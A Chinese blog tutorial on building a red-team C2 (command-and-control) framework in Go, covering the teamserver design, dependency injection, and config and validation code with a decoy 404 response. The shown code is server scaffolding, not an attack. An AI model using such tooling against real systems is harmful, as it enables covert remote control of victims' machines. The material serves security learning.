<!DOCTYPE html>
<html lang="en" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="John Doe" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  
  
  <title>
    
      从零开始手搓C2框架 
      
      
      |
    
     oneday
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.jpg">
    <link rel="icon" href="/images/favicon.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">oneday</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">从零开始手搓C2框架</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2025-10-14 22:05:59
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="Categories"></i>
                
                <span class="span--category">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-C2/" title="安全开发_C2">
                    <b>#</b> 安全开发_C2
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <blockquote>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/onedays12/OneC2_for_studying">onedays12&#x2F;OneC2_for_studying: C2 for studying</a></p>
<p>文章首发于先知社区：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18564">从零开始手搓C2框架-先知社区</a></p>
<p>作者：一天</p>
</blockquote>
<p>写完《从 SRDI 原理剖析到 PE2Shellcode 的实现》后，我一直在琢磨：能不能搭一套真正属于自己的C2框架？思路很简单——先把轮子造出来再说。Havoc、Sliver、Merlin、AdaptixC2和Iom等等优秀的开源项目，因为它们已经经过实战检验，值得我们学习它们的设计思路。我打算先全盘“临摹”，把它们的架构与设计吃透，再慢慢内化成自己的肌肉记忆，然后后期再慢慢消化为自己的开发经验。</p>
<p>至于软件工程那一套，先放一边——我既不是科班出身，也没那么多时间画UML，流程图等等:）所以就直接上手撸代码。但这也导致了一个问题，因为大多数C2服务器都是用go，而我的后端golang基础知识薄弱，以至于服务器的代码写的异常艰难，所以就在下班的时候抽出时间恶补一个月的go-gin的基础知识。</p>
<p>服务器代码主要借鉴 <strong>AdaptixC2</strong>，请多多支持一下这个项目，之后我也会借鉴其他项目的设计思路继续完善！</p>
<p>至于implant语言的选择，我起初是想选C语言的，但考虑到我是第一次开发C2框架最重要的是快速熟悉整个开发流程和实现出一个demo出来，所以我选择了go语言。想必各位师傅有自己擅长的语言，看自己需要来选择吧。后面重构implant我会使用c&#x2F;c++来实现更高级的防御规避技术以满足高强度的安全对抗场景，而且用c&#x2F;c++实现的implant是真的小，另外rust实现的也挺小的，但我不会，哈哈哈。</p>
<p>最后是GUI的选择了，为了提升用户的体验感和减轻上手难度，相当一部分的C2会提供GUI版本的客户端，就比如说大名鼎鼎的CobaltStrike。GUI还细分出浏览器和桌面级应用，而且我有跨平台的需要，经过我的深思熟虑，最终选择了QT桌面级应用，理由主要是：桌面应用可以方便的与操作系统交互，而QT的跨平台正是我需要的，当然我也考虑过webview类型的桌面应用，上手写了代码之后感觉写了太难受了所以否掉了（Electron真是害我不浅），不过后面还是要学wails。</p>
<p>我就边抄边写边调式，也算是做出了一个功能齐全的C2框架，但是代码写的太乱了，还需要重构。当然我也会开源，但不是现在。我的想法是先开源部分，等我哪天重回网安了再全部开源，我也不知道自己能不能回来。</p>
<p>好了，废话少数，我就以一个初次开发c2框架的小白提出以下在实现c2过程中的一直在脑中回荡的一些疑问：</p>
<ol>
<li>服务器怎么启动？怎么实现RPC以供客户端调用？</li>
<li>怎么配置监听器然后让它启动的呢？</li>
<li>如何选择监听器生成相应的implant？</li>
<li>implant是怎么完成上线服务器并完成注册的？</li>
<li>怎么给implant下发任务或者说命令？</li>
<li>implant又是怎么执行任务的？</li>
<li>任务执行的结果怎么回传给服务器的？</li>
</ol>
<p>C2是一个复杂的软件工程级的项目，涉及方法面面的知识，由 <strong>Listener</strong>、<strong>TeamServer</strong>、<strong>Implant</strong> 与 <strong>GUI Client</strong> 四大核心组件协同构成。本文作为一篇<strong>介绍性质的</strong>文章，我会将原先实现C2框架的代码量浓缩简化为5%左右，如果你能通过代码解决上述的问题，那么恭喜你完成了C2框架的核心。</p>
<p>什么数据库，GUI客户端，jwt鉴权等实用技术就在这里展开了，我只是在这篇文章中粗略的告诉各位师傅如何完成C2框架的搭建，距离实际的攻防实战还远远不过，还需要加上“亿”点点细节，比如说实现大文件上传与下载、监听器的完整生命周期（监听器的创建、修改、暂停和删除）、Beacon的完整生命周期（Beacon的创建、上线和删除）、浏览器（文件浏览器和进程浏览器）和隧道&#x2F;代理等，只有实现这些功能，才能真正的作为红队的基础设施。</p>
<p>本文虽然是从零开始，但我认为对新手小白极其不友好，默认各位师傅有较高的开发水平，虽然我的开发水平也不高（+-+）。本文与传统的文章不一样，<strong>是一步一步地构建出C2，而不是直接给出完整的项目</strong>，只要能复现出来就算入门c2框架搭建了。</p>
<p>也有看到一些文章说可以搭建一个几百行的c2服务器，只用bof实现大多数后渗透功能，这也是可行的，但这是开发能力有限情况下的妥协产物，并非主流。</p>
<h1 id="一、路由注册和服务器启动"><a href="#一、路由注册和服务器启动" class="headerlink" title="一、路由注册和服务器启动"></a>一、路由注册和服务器启动</h1><h2 id="1-1-Go的面向对象与依赖注入"><a href="#1-1-Go的面向对象与依赖注入" class="headerlink" title="1.1 Go的面向对象与依赖注入"></a>1.1 Go的面向对象与依赖注入</h2><p>现在，你随便去github翻找C2项目，你就会发现越来越多的开源C2服务器把后端换成Go+Gin或grpc，并不是为了高并发——几条Shell会话根本吃不满CPU——而是被写完直接之后使用交叉编译出一个单文件丢进不同操作系统都能运行的快感征服。</p>
<p>Go的语法简单、性能像C，标准库自带HTTP&#x2F;JSON&#x2F;TLS，Gin再把路由、中间件、参数绑定封装成十几行代码，开发者就能把全部精力放在协议细节而不是环境折腾上。只有写过的的人，才知道，这种顺手带来的生产力。本文不会过多介绍Gin的使用方法，请大家自行查阅网上资料。</p>
<p>先在这里介绍一些服务器的项目结构：</p>
<ul>
<li><code>controller</code>：服务器启动、路由注册，一般地，路由处理函数接收来自客户端的数据，完成数据检验、参数传递、调用相应的业务方法以及返回响应给客户端。</li>
<li><code>server</code>：<strong>New一个服务器</strong>和<strong>真正的业务</strong>的实现。</li>
<li><code>handler</code>：深度处理listener、Beacon和extension的相关业务</li>
<li><code>middlewares</code>：中间件的实现，比如说jwt鉴权（未实现）、日志、错误恢复等</li>
<li><code>utils</code>：<strong>与业务无关的小工具</strong></li>
<li><code>profile</code>：一些全局的配置</li>
</ul>
<p>在实际的开发过程中，我用到了面向对象和接口与组合，区别于传统的以过程式为主的开发思路，这是因为C2服务器中涉及到大量的自定义结构体，比如说listener、beacon、profile，taskqueue、proxy等等结构体。</p>
<p>为了避免使用全局变量在高并发的条件上数据不一致性、竞争性和代码耦合等问题，有必要用一个东西将这些结构体“装起来”。</p>
<p>另一方面，在handler中有大量的场景需要用到依赖注入，比如说需要用到teamserver实例中的方法去操作其属性（成员）。在go中依赖注入的实现方式有很多种，本项目中使用接口来声明需要用到的teamserver方法。还有另一个原因促使我使用依赖注入的是 <code>import cycle not allowed</code> 问题。</p>
<p>举一个简单的例子，当我们通过前端向某一个beacon下发命令执行的任务时，我的调用链是这样的 <code>controller.BeaconCommandExecute</code> -&gt; <code>TeamServer.BeaconCommand</code> -&gt; <code>handler.BeaconCommand</code> -&gt; <code>BeaconHandler.BeaconCommand</code> -&gt; <code>TeamServer.TaskCreate</code>。</p>
<p>可以看到在BeaconHandler的 <code>BeaconCommand</code> 方法里用到TeamServer的 <code>TaskCreate</code> 方法，这就涉及到一个依赖的问题。常规的解决方法（静态注入）是</p>
<ol>
<li><strong>传递TeamServer的指针</strong>：零抽象，一眼能看懂，强耦合。</li>
<li><strong>BeaconHandler里定义TeamServer成员</strong>：强耦合</li>
<li><strong>BeaconHandler里定义TeamServer接口</strong>：BeaconHandler彻底不知道“对面是谁”，只要相关的实例TeamServer实现TaskCreate方法即可，面向接口，解耦最干净。</li>
</ol>
<p>比如说在 <code>handler/beacon/types.go</code> 这样定义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">    TaskCreate(beaconId <span class="type">string</span>, cmdline <span class="type">string</span>, client <span class="type">string</span>, taskData response.TaskData)  </span><br><span class="line">    <span class="comment">// other</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> BeaconHandler <span class="keyword">struct</span> &#123;  </span><br><span class="line">    ts Teamserver  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>BeaconHandler对象中需要用到TeamServer方法，为了避免在定义BeaconHandler对象时添加TeamServer对象，从而暴露TeamServer所有信息，需要用到接口来拿到需要用到的TeamServer的方法（比如说TaskCreate）。</p>
<p>可能有点难懂，我的建议是多看代码去感受。</p>
<p>下文正式进入代码编写！</p>
<h2 id="1-2-服务器配置"><a href="#1-2-服务器配置" class="headerlink" title="1.2 服务器配置"></a>1.2 服务器配置</h2><p>创建一个目录，然后输入命令，推荐使用golang ide，智能提示，自动引入包等功能不是vscode能比的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go mod init OneServer</span><br></pre></td></tr></table></figure>

<p>在Go项目中引入<code>profile.json</code>作为配置文件，能有效实现配置与代码分离，避免硬编码带来的维护成本。</p>
<p>为了在程序运行期间使用到配置信息需要在 <code>profile/types.go</code> 定义相应的结构体，通过go的<strong>结构体标签</strong>能够在json反向序列时将数据绑定到相应的成员，这也是Go官方的推荐操作。</p>
<p><code>profile.json</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">    <span class="attr">&quot;TeamServer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">        <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.1.1&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8081</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;cert&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/server.crt&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/server.key&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;access_token_live_hours&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;refresh_token_live_hours&quot;</span><span class="punctuation">:</span> <span class="number">168</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;Env&quot;</span><span class="punctuation">:</span> <span class="string">&quot;debug&quot;</span>  </span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;ServerResponse&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">        <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">404</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">            <span class="attr">&quot;Content-Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/html; charset=UTF-8&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">            <span class="attr">&quot;Server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;OneC2&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">            <span class="attr">&quot;Adaptix Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v0.6&quot;</span>  </span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;pagepath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;404.html&quot;</span>  </span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span>  </span><br><span class="line">    <span class="attr">&quot;zap&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">        <span class="attr">&quot;level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;info&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;max_size&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;max_backups&quot;</span><span class="punctuation">:</span> <span class="number">30</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;max_age&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;is_console_print&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  </span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;logs/zap.log&quot;</span>  </span><br><span class="line">    <span class="punctuation">&#125;</span>  </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>profile/types.go</code> 相应的配置结构体定义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> profile  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> Profile <span class="keyword">struct</span> &#123;  </span><br><span class="line">    TeamServerConfig     TeamServerConfig     <span class="string">`json:&quot;TeamServer&quot;`</span>  </span><br><span class="line">    ServerResponseConfig ServerResponseConfig <span class="string">`json:&quot;ServerResponse&quot;`</span>  </span><br><span class="line">    ZapConfig            ZapConfig            <span class="string">`json:&quot;Zap&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> TeamServerConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Host                  <span class="type">string</span>   <span class="string">`json:&quot;host&quot;`</span>  </span><br><span class="line">    Port                  <span class="type">int</span>      <span class="string">`json:&quot;port&quot;`</span>  </span><br><span class="line">    Endpoint              <span class="type">string</span>   <span class="string">`json:&quot;endpoint&quot;`</span>  </span><br><span class="line">    Password              <span class="type">string</span>   <span class="string">`json:&quot;password&quot;`</span>  </span><br><span class="line">    Cert                  <span class="type">string</span>   <span class="string">`json:&quot;cert&quot;`</span>  </span><br><span class="line">    Key                   <span class="type">string</span>   <span class="string">`json:&quot;key&quot;`</span>  </span><br><span class="line">    Extenders             []<span class="type">string</span> <span class="string">`json:&quot;extenders&quot;`</span>  </span><br><span class="line">    AccessTokenLiveHours  <span class="type">int</span>      <span class="string">`json:&quot;access_token_live_hours&quot;`</span>  </span><br><span class="line">    RefreshTokenLiveHours <span class="type">int</span>      <span class="string">`json:&quot;refresh_token_live_hours&quot;`</span>  </span><br><span class="line">    Env                   <span class="type">string</span>   <span class="string">`json:&quot;env&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> ServerResponseConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Status   <span class="type">int</span>               <span class="string">`json:&quot;status&quot;`</span>  </span><br><span class="line">    Headers  <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;headers&quot;`</span>  </span><br><span class="line">    PagePath <span class="type">string</span>            <span class="string">`json:&quot;pagepath&quot;`</span>  </span><br><span class="line">    Page     <span class="type">string</span>            <span class="string">`json:&quot;-&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> ZapConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Level          <span class="type">string</span> <span class="string">`json:&quot;level&quot;`</span>  </span><br><span class="line">    MaxSize        <span class="type">int</span>    <span class="string">`json:&quot;max_size&quot;`</span>  </span><br><span class="line">    MaxBackups     <span class="type">int</span>    <span class="string">`json:&quot;max_backups&quot;`</span>  </span><br><span class="line">    MaxAge         <span class="type">int</span>    <span class="string">`json:&quot;max_age&quot;`</span>  </span><br><span class="line">    IsConsolePrint <span class="type">bool</span>   <span class="string">`json:&quot;is_console_print&quot;`</span>  </span><br><span class="line">    Path           <span class="type">string</span> <span class="string">`json:&quot;path&quot;`</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>profile/profile.go</code> 需要一个定义一个<code>NewProfile</code>方法返回一个Profile对象，Profile提供一些配置检验的方法，<strong>程序启动阶段</strong>就能把所有非法配置一次性拦下来，避免运行中再因配置不当panic&#x2F;Fatal，可靠性显著提高。</p>
<p>Validate()是统一入口，依次调用三个子校验函数，如果遇到一个err直接返回并阻止服务器启动：</p>
<ol>
<li>validateTeamServer()：校验C2服务器核心配置</li>
<li>validateServerResponse()：校验伪装响应页面配置</li>
<li>validateZap()：校验日志系统（Zap是 Uber的日志库）</li>
</ol>
<p><code>profile/profile.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> profile  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>  </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;regexp&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewProfile</span><span class="params">()</span></span> *Profile &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">new</span>(Profile)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Profile)</span></span> Validate() <span class="type">error</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> err := p.validateTeamServer(); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := p.validateServerResponse(); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := p.validateZap(); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Profile)</span></span> validateTeamServer() <span class="type">error</span> &#123;  </span><br><span class="line">    c := &amp;p.TeamServerConfig  </span><br><span class="line">    <span class="keyword">if</span> c.Port &lt; <span class="number">1</span> || c.Port &gt; <span class="number">65535</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;TeamServer.port must be between 1 and 65535 (current %d)&quot;</span>, c.Port)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> !ValidUriString(c.Endpoint) &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;TeamServer.endpoint must be a valid URI (current %q)&quot;</span>, c.Endpoint)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> c.Password == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;TeamServer.password must be set&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := fileMustExist(c.Cert, <span class="string">&quot;TeamServer.cert&quot;</span>); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := fileMustExist(c.Key, <span class="string">&quot;TeamServer.key&quot;</span>); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> c.AccessTokenLiveHours &lt; <span class="number">1</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;TeamServer.access_token_live_hours must be &gt; 0&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> c.RefreshTokenLiveHours &lt; <span class="number">1</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;TeamServer.refresh_token_live_hours must be &gt; 0&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Profile)</span></span> validateServerResponse() <span class="type">error</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> p.ServerResponseConfig.Page != <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> err := fileMustExist(p.ServerResponseConfig.Page, <span class="string">&quot;ServerResponse.page&quot;</span>); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> err  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Profile)</span></span> validateZap() <span class="type">error</span> &#123;  </span><br><span class="line">    c := &amp;p.ZapConfig  </span><br><span class="line">    <span class="keyword">switch</span> c.Level &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;info&quot;</span>, <span class="string">&quot;warn&quot;</span>, <span class="string">&quot;error&quot;</span>, <span class="string">&quot;dpanic&quot;</span>, <span class="string">&quot;panic&quot;</span>, <span class="string">&quot;fatal&quot;</span>:  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;Zap.level must be one of debug/info/warn/error/dpanic/panic/fatal (current %q)&quot;</span>, c.Level)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> c.MaxSize &lt;= <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;Zap.max_size must be &gt; 0&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> c.MaxBackups &lt; <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;Zap.max_backups must be &gt;= 0&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> c.MaxAge &lt; <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;Zap.max_age must be &gt;= 0&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// ---------- 辅助函数 ----------</span></span><br><span 